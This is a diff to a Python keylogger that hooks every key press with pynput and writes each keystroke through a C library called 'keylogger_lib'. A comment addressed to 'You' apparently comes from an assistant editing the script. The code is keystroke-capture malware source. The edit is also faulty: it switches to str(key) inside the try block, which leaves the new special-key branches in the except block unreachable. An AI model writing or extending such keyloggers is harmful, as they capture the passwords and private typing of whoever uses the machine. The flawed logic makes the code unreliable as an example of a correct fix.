@@ -32,14 +32,21 @@ def log_key(key_data):
 def on_press(key):
     try:
         key_data = ""
+        
         # 1. Safely convert the pynput Key object to a readable string
+        if key == keyboard.Key.esc:
+            return False  # Stop the listener
+        
         try:
             # Try to get the character for character keys (a, b, 1, 2, etc.)
-            key_data = key.char
+            key_data = str(key)
         except AttributeError:
             # Handle special keys (Key.space, Key.shift, Key.ctrl, etc.)
             # Convert the Key object to its string name for logging
-            key_data = str(key)
+            if key == keyboard.Key.space:
+                key_data = "space"
+            elif key == keyboard.Key.esc:
+                key_data = "Esc"
         
         # 2. Encode the Python string to a C-style char pointer (bytes)
         c_char_data = key_data.encode('utf-8')
@@ -49,9 +56,10 @@ def on_press(key):
         # Note: You were using cdll.c_char_p() as an argument wrapper before, 
         # but passing the bytes object directly is safer when argtypes is set.
         keylogger_lib.write(1, c_char_data, len(c_char_data)) 
-        
+
     except Exception as e:
         print(f"\n[ERROR: Could not process keystroke: {e}]")
+
 
 # Handler for key releases
 def on_release(key):
